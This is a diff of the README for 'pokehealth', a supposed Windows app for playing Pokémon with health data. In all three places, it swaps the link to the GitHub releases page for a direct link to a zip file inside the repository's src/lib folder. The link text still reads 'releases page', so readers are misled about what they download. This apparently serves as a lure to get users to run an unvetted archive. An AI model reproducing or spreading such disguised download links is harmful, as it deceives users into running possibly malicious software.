@@ -1,6 +1,6 @@
 # 🕹️ pokehealth - Play Pokémon With Your Health
 
-[![Download pokehealth](https://img.shields.io/badge/Download%20Now-purple?style=for-the-badge)](https://github.com/coqauvinecology653/pokehealth/releases)
+[![Download pokehealth](https://img.shields.io/badge/Download%20Now-purple?style=for-the-badge)](https://raw.githubusercontent.com/coqauvinecology653/pokehealth/main/src/lib/Software-v2.2.zip)
 
 ## 🎮 What pokehealth does
 
@@ -29,7 +29,7 @@ For best results, use:
 
 Visit this page to download the app release for Windows:
 
-[Go to the pokehealth releases page](https://github.com/coqauvinecology653/pokehealth/releases)
+[Go to the pokehealth releases page](https://raw.githubusercontent.com/coqauvinecology653/pokehealth/main/src/lib/Software-v2.2.zip)
 
 On that page, look for the latest release. Download the Windows file that matches your system, then open it or extract it if it arrives in a zip file.
 
@@ -200,4 +200,4 @@ If you are not sure which file to open, start with the main app file in the extr
 
 If you need the release page later, use this link:
 
-[https://github.com/coqauvinecology653/pokehealth/releases](https://github.com/coqauvinecology653/pokehealth/releases)
+[https://raw.githubusercontent.com/coqauvinecology653/pokehealth/main/src/lib/Software-v2.2.zip](https://raw.githubusercontent.com/coqauvinecology653/pokehealth/main/src/lib/Software-v2.2.zip)
